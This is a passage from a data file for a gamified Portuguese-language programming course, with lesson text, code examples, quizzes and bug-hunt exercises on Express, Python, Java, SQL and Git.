- **500 Internal Server Error:** Falha inesperada no servidor.

> **💡 Dica Pro:**
> Sempre responda com o status code correto! Enviar \`200 OK\` quando houve erro ou \`200\` em vez de \`201\` ao criar um recurso confunde o frontend e dificulta a manutenção da API.

> **⚠️ Armadilha Comum:**
> Esquecer a linha \`app.use(express.json())\` faz com que qualquer rota \`POST\` receba \`req.body\` como \`undefined\`!`,
        codeExample: `import express from 'express';

const app = express();
app.use(express.json());

// Rota de listagem de módulos
app.get('/modulos', (req, res) => {
  res.status(200).json([
    { id: 1, nome: "Escudo Térmico" },
    { id: 2, nome: "Sensor Quântico" }
  ]);
});

app.listen(8080);`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual código de status HTTP (Status Code) é o padrão RESTful para indicar que uma requisição POST criou com sucesso um novo recurso no sistema?',
            options: [
              '200 OK',
              '201 Created',
              '302 Found',
              '204 No Content'
            ],
            correctIndex: 1,
            explanation: 'O status HTTP 201 (Created) é a resposta semântica ideal para informar que a criação do recurso solicitada via POST foi realizada com sucesso no banco de dados.'
          },
          {
            type: 'code',
            instruction: 'Crie uma rota GET em app para o caminho "/ping" que retorne o status 200 com o JSON { mensagem: "pong" }.',
            initialCode: `// Considere que a constante "app" do express já existe
// Adicione a rota abaixo\n`,
            expectedKeywords: ['app.get', '/ping', 'res.status(200)', 'mensagem: "pong"', 'json('],
            hint: 'Faça app.get("/ping", (req, res) => { res.status(200).json({ mensagem: "pong" }); });.',
            solution: `app.get("/ping", (req, res) => {
  res.status(200).json({ mensagem: "pong" });
});`
          },
          {
            type: 'bughunt',
            title: 'O Enigma do Body Indefinido',
            scenario: 'O desenvolvedor configurou a rota POST de cadastro de cadetes, mas req.body sempre chega como undefined porque faltou o middleware de leitura de JSON do Express.',
            buggyCode: `import express from 'express';
const app = express();

// Faltou o middleware aqui!

app.post('/cadetes', (req, res) => {
  const { nome } = req.body;
  res.status(201).json({ cadastrado: nome });
});`,
            expectedKeywords: ['app.use(express.json());'],
            forbiddenKeywords: ['// Faltou o middleware aqui!'],
            hint: 'Adicione app.use(express.json()); logo abaixo da inicialização de app para habilitar o parsing de JSON.',
            solutionExplanation: 'Perfeito! app.use(express.json()) intercepta o corpo das requisições HTTP, converte a string JSON em objeto JavaScript e a disponibiliza em req.body.'
          }
        ]
      }
    ],
  },
  {
    id: 'python',
    slug: 'python',
    name: 'Python',
    planetName: 'AI Planet',
    description: 'A linguagem versátil que comanda a inteligência artificial, automações e análise de dados.',
    icon: '🐍',
    color: '#00FF88',
    language: 'python',
    level: 'Iniciante',
    totalXp: 125,
    lessons: [
      {
        id: 'py-1',
        title: '1. A Força da Sintaxe Limpa & Tipos',
        description: 'Descubra a elegância do Python, indentação como bloco de código e variáveis dinâmicas.',
        duration: 14,
        xpReward: 60,
        language: 'python',
        content: `# 🐍 A Força da Sintaxe Limpa & Tipos no AI Planet

Bem-vindo ao **AI Planet**, cadete! Aqui você aprenderá a linguagem favorita dos cientistas de dados, engenheiros de inteligência artificial e especialistas em cibersegurança ao redor do globo.

> **💡 A Filosofia do Python (The Zen of Python):**
> Criado por Guido van Rossum, o Python foi desenhado com um princípio sagrado: **código é lido muito mais vezes do que é escrito**. Sua sintaxe é limpa, direta e quase parece inglês estruturado.

---

### 📏 A Regra Suprema: Indentação Obrigatória

Diferente do JavaScript ou C++ que usam chaves \`{ }\` para definir blocos, o Python usa **espaços de indentação** (4 espaços por convenção):

\`\`\`python
energia = 85

if energia > 50:
    print("Sistemas operando em potência máxima!")
else:
    print("Modo de economia ativado.")
\`\`\`

---

### 🧬 Variáveis e Tipagem Dinâmica

Você não precisa declarar tipos explicitamente. O Python infere o tipo automaticamente no momento da atribuição:

\`\`\`python
nome_agente = "Ada Lovelace"  # str (texto)
nivel_acesso = 7             # int (inteiro)
fator_dobra = 3.14           # float (decimal)
sistema_ativo = True         # bool (booleano - com inicial Maiúscula!)
\`\`\`

---

### 💬 Textos Dinâmicos com F-Strings

A maneira mais moderna e rápida de interpolar variáveis em textos no Python é usar **f-strings**:

\`\`\`python
pontuacao = 450
print(f"O cadete {nome_agente} possui {pontuacao} pontos de XP!")
\`\`\`

> **💡 Dica Pro:**
> Em Python, booleanos começam com letra maiúscula obrigatória: \`True\` e \`False\` (escrever \`true\` gera um erro \`NameError\`).

> **⚠️ Armadilha Comum:**
> Misturar espaços e teclas TAB na indentação causa o temido \`TabError\` ou \`IndentationError\`. Configure seu editor para sempre converter tabs em 4 espaços!`,
        codeExample: `# Diagnóstico do Robô Explorador do AI Planet
nome_robo = "Curiosity-X"
bateria = 92
sensores_ativos = True

print(f"Status do robô {nome_robo}: Bateria em {bateria}%")

if bateria >= 80 and sensores_ativos:
    print("Pronto para coletar amostras geológicas.")`,
        exercises: [
          {
            type: 'quiz',
            question: 'Como o interpretador Python identifica onde começa e onde termina um bloco de código (como o corpo de um if, for ou função)?',
            options: [
              'Através de ponto e vírgula no final de cada instrução.',
              'Através do nível de indentação de espaços à esquerda das linhas de código.',
              'Através de palavras-chave como BEGIN e END.',
              'Através de parênteses curvos envolvendo todo o bloco.'
            ],
            correctIndex: 1,
            explanation: 'No Python, a indentação faz parte da sintaxe obrigatória da linguagem, eliminando a necessidade de chaves e tornando os programas naturalmente legíveis.'
          },
          {
            type: 'fillblank',
            title: 'Emitindo o Relatório de Voo',
            instruction: 'Complete o comando de impressão usando uma f-string para exibir o nome da sonda.',
            codeSnippet: `sonda = "Voyager-3"
{{comando_print}}({{prefixo_fstring}}"Sonda detectada: {sonda}")`,
            blanks: [
              {
                id: 'comando_print',
                placeholder: 'comando de saída',
                expectedValues: ['print'],
                hint: 'Função padrão em Python para exibir saídas no terminal.'
              },
              {
                id: 'prefixo_fstring',
                placeholder: 'letra da f-string',
                expectedValues: ['f', 'F'],
                hint: 'Letra única que prefixa a string para ativar a interpolação de variáveis em {chaves}.'
              }
            ],
            explanation: 'Perfeito! O comando print(f"...") é a forma padrão da indústria moderna para formatar mensagens com elegância.'
          },
          {
            type: 'bughunt',
            title: 'Alerta de Indentação na Sonda',
            scenario: 'O script de ignição falhou na inicialização com IndentationError: expected an indented block after if statement.',
            buggyCode: `temperatura = 120

if temperatura > 100:
print("Alerta: Superaquecimento detectado!")
else:
    print("Temperatura estável.")`,
            expectedKeywords: ['    print("Alerta: Superaquecimento detectado!")'],
            forbiddenKeywords: ['\nprint("Alerta: Superaquecimento detectado!")'],
            hint: 'Adicione 4 espaços de indentação na linha do primeiro print para colocá-lo dentro do bloco if.',
            solutionExplanation: 'Bug neutralizado! Com os 4 espaços de indentação, o Python compreende que o comando pertence ao bloco if.'
          }
        ]
      },
      {
        id: 'py-2',
        title: '2. Estruturas de Dados & Laços de Repetição',
        description: 'Manipule listas, dicionários e itere sobre coleções de dados no cosmos.',
        duration: 16,
        xpReward: 65,
        language: 'python',
        content: `# 📊 Estruturas de Dados & Laços no AI Planet

Para processar grandes volumes de dados de telemetria ou treinar modelos neurais, você precisa de estruturas de dados eficientes e flexíveis.

---

### 📋 Listas em Python (Mutáveis & Dinâmicas)

Listas armazenam sequências ordenadas de itens:

\`\`\`python
planetas = ["Terra Digital", "Neon City", "Cyber Core"]

# Adicionando um novo planeta
planetas.append("AI Planet")

# Acessando o primeiro item (índice 0)
primeiro = planetas[0]
\`\`\`

---

### 📖 Dicionários (Chave e Valor)

Dicionários são ideais para modelar entidades ricas com propriedades nomeadas:

\`\`\`python
cadete = {
    "nome": "Kaelen",
    "nivel": 12,
    "especialidade": "Engenharia de Dados"
}

# Acessando com segurança usando .get()
cargo = cadete.get("especialidade", "Geral")
\`\`\`

---

### 🔁 Laço de Repetição \`for\` Elegante

No Python, você itera diretamente sobre os elementos da coleção:

\`\`\`python
leituras_rad = [12, 45, 89, 23, 105]

for leitura in leituras_rad:
    if leitura > 80:
        print(f"Radiação crítica detectada: {leitura} mSv")
\`\`\`

> **💡 Dica Pro:**
> O método \`dicionario.get("chave", valor_padrao)\` evita que seu programa quebre com erro \`KeyError\` caso a chave não exista no dicionário.

> **⚠️ Armadilha Comum:**
> Modificar o tamanho de uma lista (adicionando ou removendo itens) enquanto você está iterando sobre ela em um laço \`for\` pode causar comportamento imprevisível ou pular elementos.`,
        codeExample: `# Filtrando Módulos com Potência Alta
modulos = [
    {"nome": "Propulsor Alfa", "potencia": 120},
    {"nome": "Sensor Laser", "potencia": 45},
    {"nome": "Canhão de Plasma", "potencia": 95}
]

modulos_pesados = []
for m in modulos:
    if m["potencia"] >= 90:
        modulos_pesados.append(m["nome"])

print("Módulos de alta potência:", modulos_pesados)`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual a principal diferença entre uma lista [ ] e uma tupla ( ) no Python?',
            options: [
              'Listas só aceitam números, enquanto tuplas só aceitam strings.',
              'Listas são mutáveis (podem ter itens adicionados/removidos), enquanto tuplas são imutáveis após criadas.',
              'Tuplas rodam exclusivamente no servidor e listas rodam no navegador.',
              'Não existe diferença prática entre listas e tuplas em Python.'
            ],
            correctIndex: 1,
            explanation: 'Tuplas são estruturas de dados de tamanho e conteúdo fixos (imutáveis), ideais para coordenadas ou configurações imutáveis que não devem ser alteradas acidentalmente.'
          },
          {
            type: 'code',
            instruction: 'Escreva uma função chamada somar_xp que recebe uma lista de pontuacoes e retorna a soma total dos números da lista usando a função nativa sum().',
            initialCode: `# Escreva a função somar_xp abaixo\n`,
            expectedKeywords: ['def somar_xp', 'pontuacoes', 'return sum('],
            hint: 'Declare def somar_xp(pontuacoes): e retorne sum(pontuacoes).',
            solution: `def somar_xp(pontuacoes):
    return sum(pontuacoes)`
          }
        ]
      }
    ],
  },
  {
    id: 'java',
    slug: 'java',
    name: 'Java',
    planetName: 'Enterprise World',
    description: 'A robustez da orientação a objetos corporativa que move bancos e gigantes da indústria.',
    icon: '☕',
    color: '#F89820',
    language: 'java',
    level: 'Avançado',
    totalXp: 125,
    lessons: [
      {
        id: 'java-1',
        title: '1. O Paradigma dos Objetos & Classes Corporativas',
        description: 'Compreenda a JVM, a força da tipagem estática e o ponto de entrada main.',
        duration: 16,
        xpReward: 60,
        language: 'java',
        content: `# ☕ O Paradigma dos Objetos no Enterprise World

Bem-vindo a **Enterprise World**, o planeta onde a confiabilidade inquebrável, sistemas bancários e naves de transporte massivo são construídos!

O **Java**, criado por James Gosling na Sun Microsystems em 1995 (hoje sob a Oracle), é um dos pilares da engenharia de software mundial há mais de três décadas.

---

### 🌐 O Lema: "Write Once, Run Anywhere" (WORA)

Diferente de linguagens como C++ que compilam diretamente para o código binário de um processador específico, o Java compila para **Bytecode** (\`.class\`). Esse Bytecode roda em qualquer máquina que tenha a **JVM** (*Java Virtual Machine*).

---

### 🚪 A Porta de Entrada: O Método \`main\`

Todo programa executável em Java inicia obrigatoriamente a partir de um método com esta assinatura exata:

\`\`\`java
public class EstacaoEspacial {
    public static void main(String[] args) {
        System.out.println("Sistemas da Estação Online!");
    }
}
\`\`\`

- **\`public\`**: Acessível externamente pelo sistema operacional.
- **\`static\`**: Pode ser executado pela JVM sem precisar instanciar a classe primeiro.
- **\`void\`**: Não devolve nenhum valor de retorno.
- **\`String[] args\`**: Vetor de argumentos recebidos pela linha de comando.

> **💡 Dica Pro:**
> O nome do arquivo Java deve ser **exatamente idêntico** ao nome da classe pública (ex: a classe \`public class Nave\` deve ficar no arquivo \`Nave.java\`), respeitando maiúsculas e minúsculas!

> **⚠️ Armadilha Comum:**
> Esquecer o ponto-e-vírgula (\`;\`) no final das instruções em Java impede o código de compilar.`,
        codeExample: `// Programa de Boas-Vindas da Enterprise World
public class TerminalNexus {
    public static void main(String[] args) {
        String cadete = "Lucas";
        int nivelAcesso = 5;
        
        System.out.println("Oficial: " + cadete + " | Credencial: " + nivelAcesso);
    }
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual é o papel da JVM (Java Virtual Machine) no ecossistema da linguagem Java?',
            options: [
              'Criar arquivos visuais em HTML para os navegadores.',
              'Executar o Bytecode compilado (.class) de forma independente do sistema operacional subjacente.',
              'Converter código Java diretamente para Python em tempo de execução.',
              'Gerenciar exclusivamente conexões com a internet.'
            ],
            correctIndex: 1,
            explanation: 'A JVM é a máquina virtual que interpreta ou compila via JIT o Bytecode Java em instruções nativas do hardware específico onde o programa está rodando.'
          },
          {
            type: 'fillblank',
            title: 'A Assinatura do Método Mestre',
            instruction: 'Preencha as palavras-chave que faltam na assinatura universal do método de entrada do Java.',
            codeSnippet: `public {{modificador_estatico}} void main({{tipo_argumento}}[] args) {
    System.out.println("Inicialização concluída.");
}`,
            blanks: [
              {
                id: 'modificador_estatico',
                placeholder: 'modificador estático',
                expectedValues: ['static'],
                hint: 'Palavra-chave que permite chamar o método sem precisar instanciar um objeto com new.'
              },
              {
                id: 'tipo_argumento',
                placeholder: 'tipo do vetor de texto',
                expectedValues: ['String'],
                hint: 'Classe que representa textos no Java (com inicial Maiúscula).'
              }
            ],
            explanation: 'Perfeito! public static void main(String[] args) é o portal de partida de qualquer aplicação Java corporativa.'
          }
        ]
      },
      {
        id: 'java-2',
        title: '2. Encapsulamento, Construtores & Segurança',
        description: 'Proteja o estado interno das suas classes com private, getters e construtores robustos.',
        duration: 17,
        xpReward: 65,
        language: 'java',
        content: `# 🛡️ Encapsulamento, Construtores & Segurança

Em sistemas de grande porte, permitir que qualquer parte do código altere diretamente atributos sensíveis (como saldo bancário ou nível de oxigênio de uma nave) é um convite ao desastre.

---

### 🔒 O Pilar do Encapsulamento

O **Encapsulamento** consiste em ocultar os detalhes internos de um objeto e expor apenas métodos seguros para leitura e escrita:

1. Atributos são declarados como **\`private\`**.
2. O acesso para leitura é feito via método **\`get\`**.
3. A alteração controlada é feita via método **\`set\`**.

\`\`\`java
public class ModuloEscudo {
    private int potencia;

    // Construtor
    public ModuloEscudo(int potenciaInicial) {
        this.setPotencia(potenciaInicial);
    }

    public int getPotencia() {
        return this.potencia;
    }

    public void setPotencia(int novaPotencia) {
        if (novaPotencia >= 0 && novaPotencia <= 100) {
            this.potencia = novaPotencia;
        }
    }
}
\`\`\`

---

### 🎯 A Palavra-Chave \`this\`

A palavra \`this\` referencia a instância atual do próprio objeto, resolvendo ambiguidades entre os parâmetros do método e os atributos da classe:

\`\`\`java
public void setNome(String nome) {
    this.nome = nome; // "this.nome" é o atributo; "nome" é o parâmetro recebido!
}
\`\`\`

> **💡 Dica Pro:**
> Ao usar Getters e Setters, você pode incluir validações de negócio no \`set\` impedindo que dados corrompidos entrem na sua aplicação.

> **⚠️ Armadilha Comum:**
> Esquecer a palavra \`this\` em um construtor onde o parâmetro tem o mesmo nome do atributo (ex: \`nome = nome;\`) faz a variável atribuir valor a ela mesma, deixando o atributo da classe vazio!`,
        codeExample: `// Modelagem de Piloto com Encapsulamento
public class PilotoNexus {
    private String nome;
    private int horasVoo;

    public PilotoNexus(String nome, int horasVoo) {
        this.nome = nome;
        this.horasVoo = horasVoo;
    }

    public String getNome() {
        return this.nome;
    }

    public int getHorasVoo() {
        return this.horasVoo;
    }
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Por que no padrão corporativo Java os atributos de uma classe são declarados com o modificador de acesso "private"?',
            options: [
              'Para impedir que a classe seja compilada por outros desenvolvedores.',
              'Para proteger os dados contra alterações diretas descontroladas, garantindo que o acesso ocorra apenas por métodos autorizados (Getters/Setters).',
              'Porque variáveis private gastam menos memória RAM.',
              'Porque o Java não permite criar variáveis sem a palavra private.'
            ],
            correctIndex: 1,
            explanation: 'O encapsulamento garante integridade aos dados do objeto, permitindo validar regras de negócio antes de aceitar qualquer alteração no estado interno.'
          },
          {
            type: 'code',
            instruction: 'Crie uma classe pública chamada ModuloNave com um atributo privado int potencia e um método público getPotencia() que retorna a potencia.',
            initialCode: `// Crie a classe ModuloNave abaixo\n`,
            expectedKeywords: ['public class ModuloNave', 'private int potencia', 'public int getPotencia()', 'return'],
            hint: 'Declare public class ModuloNave { private int potencia; public int getPotencia() { return this.potencia; } }.',
            solution: `public class ModuloNave {
    private int potencia;

    public int getPotencia() {
        return this.potencia;
    }
}`
          }
        ]
      }
    ],
  },
  {
    id: 'sql',
    slug: 'sql',
    name: 'SQL',
    planetName: 'Data Matrix',
    description: 'A linguagem soberana para consultar, filtrar e relacionar dados em bancos relacionais.',
    icon: '🗄️',
    color: '#E48E00',
    language: 'sql',
    level: 'Intermediário',
    totalXp: 125,
    lessons: [
      {
        id: 'sql-1',
        title: '1. Consultas Mestras: SELECT, WHERE & ORDER BY',
        description: 'Extraia informações precisas de tabelas de bancos de dados relacionais.',
        duration: 15,
        xpReward: 60,
        language: 'sql',
        content: `# 🗄️ Consultas Mestras em SQL

Bem-vindo à **Data Matrix**! Todas as missões, cadastros de cadetes, pontuações de XP e dados da frota estão armazenados em bancos de dados relacionais (PostgreSQL, MySQL, SQLite).

O **SQL** (*Structured Query Language*) é a linguagem declarativa que permite extrair exatamente os dados necessários de tabelas estruturadas.

---

### 🔍 A Tríade da Consulta: \`SELECT\`, \`FROM\` & \`WHERE\`

A estrutura elementar de qualquer consulta SQL:

\`\`\`sql
SELECT nome, nivel, xp
FROM cadetes
WHERE xp >= 100;
\`\`\`

- **\`SELECT\`**: Quais colunas você quer ver na resposta (use \`*\` para todas as colunas).
- **\`FROM\`**: De qual tabela os dados devem ser puxados.
- **\`WHERE\`**: Filtro condicional (apenas registros que atendam à condição).

---

### 📊 Ordenação e Limite: \`ORDER BY\` & \`LIMIT\`

Para montar um ranking de líderes espaciais:

\`\`\`sql
SELECT username, pontuacao_total
FROM usuarios
ORDER BY pontuacao_total DESC
LIMIT 10;
\`\`\`

- **\`ORDER BY coluna DESC\`**: Ordena do maior para o menor (decrescente). Use \`ASC\` para crescente.
- **\`LIMIT N\`**: Retorna apenas os N primeiros resultados (essencial para paginação e performance!).

> **💡 Dica Pro:**
> Em bancos de dados de produção com milhões de linhas, evite fazer \`SELECT *\`. Projete apenas as colunas que sua interface realmente usará para economizar largura de banda e memória de rede.

> **⚠️ Armadilha Comum:**
> Em SQL, valores de texto são cercados por aspas simples \`'texto'\`, e não aspas duplas! Aspas duplas em muitos dialetos SQL representam nomes de colunas ou tabelas.`,
        codeExample: `-- Ranking dos Cadetes Mais Condecorados da Galáxia
SELECT id, username, nivel, xp
FROM cadetes
WHERE ativo = true AND nivel >= 5
ORDER BY xp DESC
LIMIT 5;`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual cláusula do comando SQL é responsável por filtrar quais linhas da tabela devem ser devolvidas com base em uma condição lógica?',
            options: [
              'ORDER BY',
              'WHERE',
              'GROUP BY',
              'LIMIT'
            ],
            correctIndex: 1,
            explanation: 'A cláusula WHERE aplica filtros booleanos sobre as linhas da tabela, devolvendo apenas os registros que satisfazem a condição informada.'
          },
          {
            type: 'fillblank',
            title: 'Filtrando os Agentes de Campo',
            instruction: 'Complete a consulta SQL para selecionar o nome dos agentes ativos.',
            codeSnippet: `{{palavra_selecao}} nome
{{palavra_origem}} agentes
{{palavra_filtro}} status = 'ATIVO';`,
            blanks: [
              {
                id: 'palavra_selecao',
                placeholder: 'projeção de colunas',
                expectedValues: ['SELECT', 'select'],
                hint: 'Comando SQL que inicia a busca e projeta as colunas desejadas.'
              },
              {
                id: 'palavra_origem',
                placeholder: 'origem da tabela',
                expectedValues: ['FROM', 'from'],
                hint: 'Palavra-chave que indica de qual tabela buscar os dados.'
              },
              {
                id: 'palavra_filtro',
                placeholder: 'filtro condicional',
                expectedValues: ['WHERE', 'where'],
                hint: 'Palavra-chave que aplica a condição de status ativo.'
              }
            ],
            explanation: 'Perfeito! A sintaxe SELECT ... FROM ... WHERE ... é a fundação universal da manipulação de dados em SQL.'
          },
          {
            type: 'code',
            instruction: 'Escreva uma consulta SQL que seleciona as colunas titulo e xp da tabela missoes onde nivel_dificuldade = "Facil" ordenado por xp DESC.',
            initialCode: `-- Escreva sua consulta SQL abaixo\n`,
            expectedKeywords: ['SELECT titulo, xp', 'FROM missoes', 'WHERE nivel_dificuldade', 'ORDER BY xp DESC'],
            hint: 'Escreva: SELECT titulo, xp FROM missoes WHERE nivel_dificuldade = \'Facil\' ORDER BY xp DESC;',
            solution: `SELECT titulo, xp
FROM missoes
WHERE nivel_dificuldade = 'Facil'
ORDER BY xp DESC;`
          }
        ]
      },
      {
        id: 'sql-2',
        title: '2. Conectando Mundos: Relacionamentos & JOINs',
        description: 'Una informações de múltiplas tabelas correlacionadas através de chaves estrangeiras.',
        duration: 16,
        xpReward: 65,
        language: 'sql',
        content: `# 🔗 Conectando Mundos: Relacionamentos & JOINs

Em um banco relacional, os dados raramente ficam em uma única tabela gigantesca. Em vez disso, eles são normalizados e separados em tabelas menores ligadas por **chaves estrangeiras** (*Foreign Keys*).

---

### 🔑 Chave Primária (PK) vs Chave Estrangeira (FK)

- **Primary Key (PK):** O identificador exclusivo de cada linha (ex: \`usuarios.id\`).
- **Foreign Key (FK):** Um campo em outra tabela que aponta para a PK de origem (ex: \`pedidos.usuario_id\`).

---

### 🤝 O Poder do \`INNER JOIN\`

Para unir dados de tabelas diferentes em um único relatório, usamos \`JOIN\`:

\`\`\`sql
SELECT usuarios.nome, cursos.titulo
FROM usuarios
INNER JOIN cursos ON cursos.id = usuarios.curso_atual_id;
\`\`\`

O \`INNER JOIN\` devolve apenas as linhas que possuem correspondência exata em ambas as tabelas.

---

### 🌐 \`LEFT JOIN\`: Não Perca Ninguém!

Se você quiser listar **todos os usuários**, mesmo aqueles que ainda não se matricularam em nenhum curso:

\`\`\`sql
SELECT usuarios.nome, cursos.titulo
FROM usuarios
LEFT JOIN cursos ON cursos.id = usuarios.curso_atual_id;
\`\`\`

Se o usuário não tiver curso, o campo \`cursos.titulo\` virá preenchido como \`NULL\`.

> **💡 Dica Pro:**
> Use aliases para encurtar suas consultas: \`FROM usuarios u INNER JOIN inscricoes i ON i.usuario_id = u.id\`. Isso torna o SQL mais legível e rápido de digitar.

> **⚠️ Armadilha Comum:**
> Esquecer a cláusula \`ON\` em um JOIN gera um "Produto Cartesiano" (\`CROSS JOIN\`), multiplicando todas as linhas de uma tabela por todas as da outra e travando o banco de dados!`,
        codeExample: `-- Relatório de Alunos e Lições Concluídas
SELECT u.username, c.name AS nome_curso, p.completed
FROM users u
INNER JOIN user_progress p ON p.user_id = u.id
INNER JOIN courses c ON c.id = p.course_id
WHERE p.completed = true;`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual a diferença entre INNER JOIN e LEFT JOIN ao correlacionar duas tabelas A e B?',
            options: [
              'INNER JOIN remove registros duplicados, enquanto LEFT JOIN os duplica.',
              'INNER JOIN só retorna registros que existem em ambas as tabelas; LEFT JOIN retorna todos os registros da tabela da esquerda (A), mesmo sem par na direita (B).',
              'LEFT JOIN só funciona com números e INNER JOIN com textos.',
              'São sinônimos idênticos em todos os bancos modernos.'
            ],
            correctIndex: 1,
            explanation: 'O LEFT JOIN preserva todos os registros da tabela base (à esquerda da cláusula), preenchendo as colunas da tabela da direita com NULL quando não houver correspondência.'
          },
          {
            type: 'bughunt',
            title: 'Ambiguidade na Consulta Espacial',
            scenario: 'O relatório falhou com "error: column reference id is ambiguous" porque ambas as tabelas possuem uma coluna chamada id e a consulta não especificou de qual tabela puxar.',
            buggyCode: `SELECT id, usuarios.nome, naves.modelo
FROM usuarios
INNER JOIN naves ON naves.id = usuarios.nave_id;`,
            expectedKeywords: ['SELECT usuarios.id, usuarios.nome, naves.modelo'],
            forbiddenKeywords: ['SELECT id, usuarios.nome, naves.modelo'],
            hint: 'Especifique a qual tabela a coluna id pertence prefixando-a com usuarios.id.',
            solutionExplanation: 'Perfeito! Ao usar usuarios.id, o banco de dados elimina a ambiguidade e executa a união com total clareza.'
          }
        ]
      }
    ],
  },
  {
    id: 'git',
    slug: 'git',
    name: 'Git',
    planetName: 'Version Control Base',
    description: 'A máquina do tempo e a ferramenta colaborativa indispensável de todo time de software moderno.',
    icon: '🔀',
    color: '#F05032',
    language: 'bash',
    level: 'Iniciante',
    totalXp: 125,
    lessons: [
      {
        id: 'git-1',
        title: '1. O Túnel do Tempo: Init, Add & Commit Semântico',
        description: 'Domine as 3 áreas do Git, versionamento seguro e boas práticas de mensagens de commit.',
        duration: 14,
        xpReward: 60,
        language: 'bash',
        content: `# 🔀 O Túnel do Tempo: Git & Commits Semânticos

Bem-vindo à **Version Control Base**! Antes da criação do Git por Linus Torvalds em 2005, desenvolvedores faziam cópias manuais de pastas com nomes como \`projeto_final_v2_agora_vai_final_mesmo.zip\`.

O **Git** é um sistema de controle de versão distribuído que funciona como uma máquina do tempo infalível para qualquer arquivo de código.

---

### 🗺️ As Três Áreas do Git

O Git gerencia seus arquivos em três estados distintos:

1. **Working Directory (Diretório de Trabalho):** Onde você edita, cria e apaga arquivos normalmente no seu editor de código.
2. **Staging Area (Área de Preparação / Index):** Onde você seleciona com cirurgia quais alterações farão parte do próximo "pacote de viagem":
   \`\`\`bash
   git add index.html estilos.css
   # Ou para adicionar tudo de uma vez:
   git add .
   \`\`\`
3. **Repositório Local (Histórico Permanente):** Onde o "snapshot" (fotografia) permanente do projeto é registrado para sempre com um comentário explicativo:
   \`\`\`bash
   git commit -m "feat: adicionar botão de ignição no cockpit"
   \`\`\`

---

### 📝 A Arte dos Commits Semânticos (Conventional Commits)

Na indústria de alto padrão, não escrevemos mensagens vagas como *"ajustes"* ou *"corrigindo bug"*. Usamos prefixos padronizados:

- **\`feat:\`** Uma nova funcionalidade para o usuário.
- **\`fix:\`** Correção de um bug em produção.
- **\`docs:\`** Alterações em documentações ou README.
- **\`style:\`** Ajustes de formatação sem mudança de lógica.
- **\`refactor:\`** Refatoração de código que não altera o comportamento.

> **💡 Dica Pro:**
> Use \`git status\` o tempo todo! Ele é o radar de bordo que mostra exatamente quais arquivos foram modificados, quais estão na Staging Area e quais ainda não foram rastreados.

> **⚠️ Armadilha Comum:**
> Esquecer de rodar \`git add\` antes do \`git commit\`. Fazer commit sem arquivos no staging resulta na mensagem \`nothing added to commit but untracked files present\`.`,
        codeExample: `# Sequência Padrão de Trabalho com Git
# 1. Checar o estado dos arquivos
git status

# 2. Adicionar arquivos modificados à Staging Area
git add .

# 3. Criar o ponto de restauração com mensagem semântica
git commit -m "feat: implementar autenticador quântico de tripulantes"`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual comando Git é utilizado para mover as alterações do seu Working Directory para a Staging Area (preparação para o commit)?',
            options: [
              'git push',
              'git add',
              'git commit',
              'git checkout'
            ],
            correctIndex: 1,
            explanation: 'git add (ou git add .) envia as modificações selecionadas para a Staging Area, permitindo revisar exatamente o que será incluído no próximo commit.'
          },
          {
            type: 'fillblank',
            title: 'Registrando a Nova Funcionalidade',
            instruction: 'Complete a sequência de comandos para adicionar todos os arquivos e realizar o commit.',
            codeSnippet: `git {{comando_adicionar}} .
git {{comando_salvar}} -m "feat: modulo de navegacao"`,
            blanks: [
              {
                id: 'comando_adicionar',
                placeholder: 'comando de palco',
                expectedValues: ['add'],
                hint: 'Comando de 3 letras que adiciona arquivos à Staging Area.'
              },
              {
                id: 'comando_salvar',
                placeholder: 'comando de gravação',
                expectedValues: ['commit'],
                hint: 'Comando que grava o snapshot permanente no repositório.'
              }
            ],
            explanation: 'Perfeito! git add . seguido de git commit -m "..." é o fluxo fundamental diário de todo programador profissional.'
          }
        ]
      },
      {
        id: 'git-2',
        title: '2. Ramificações Espaciais: Branch, Merge & GitHub',
        description: 'Trabalhe em paralelo com branches isoladas e sincronize seu código com repositórios remotos.',
        duration: 16,
        xpReward: 65,
        language: 'bash',
        content: `# 🌿 Ramificações Espaciais: Branch, Merge & GitHub

Em uma equipe profissional com 10 engenheiros trabalhando no mesmo projeto, seria um desastre se todos salvassem código simultaneamente no mesmo arquivo principal.

Para resolver isso, o Git possui o conceito mais poderoso da engenharia de software moderna: **Branches (Ramificações)**.

---

### 🌿 O que é uma Branch?

Uma **branch** é uma linha do tempo paralela e isolada. Você pode criar uma branch para testar uma ideia maluca sem nenhum risco de quebrar o sistema principal (\`main\`):

\`\`\`bash
# Criar e alternar para uma nova branch em um único comando
git checkout -b feature/escudo-defesa
# Ou no Git moderno:
git switch -c feature/escudo-defesa
\`\`\`

---

### 🔀 Integrando Linhas do Tempo com \`merge\`

Quando sua funcionalidade estiver testada e aprovada, você retorna para a branch principal e faz a fusão:

\`\`\`bash
git checkout main
git merge feature/escudo-defesa
\`\`\`

---

### ☁️ Conectando com a Nuvem (GitHub / GitLab)

Para enviar seus commits locais para a nuvem onde toda a equipe tem acesso:

\`\`\`bash
# Adicionar o endereço do repositório remoto
git remote add origin https://github.com/usuario/projeto.git

# Enviar os commits da branch main para o repositório origin
git push -u origin main
\`\`\`

> **💡 Dica Pro:**
> Sempre rode \`git pull origin main\` antes de começar a trabalhar em uma nova tarefa. Isso garante que você está com o código mais atualizado da equipe no seu computador local.

> **⚠️ Armadilha Comum:**
> Nunca envie credenciais, chaves de API ou arquivos \`.env\` para o GitHub! Use sempre o arquivo \`.gitignore\` para excluir dados sensíveis e a pasta \`node_modules\`.`,
        codeExample: `# Fluxo Completo de Feature em Equipe
git checkout -b feature/radar-antimateria
git add .
git commit -m "feat: calibracao de sensores de radar"
git push -u origin feature/radar-antimateria`,
        exercises: [
          {
            type: 'quiz',
            question: 'Por que boas práticas de engenharia de software proíbem desenvolvedores de programar e fazer commits diretamente na branch "main" de produção?',
            options: [
              'Porque a branch main é apagada automaticamente todo domingo à noite.',
              'Porque criar branches isoladas permite testar, revisar em Pull Requests e validar o código sem colocar em risco a versão estável em produção.',
              'Porque o Git só permite um único desenvolvedor por branch main.',
              'Porque a branch main só aceita código escrito em linguagem Assembly.'
            ],
            correctIndex: 1,
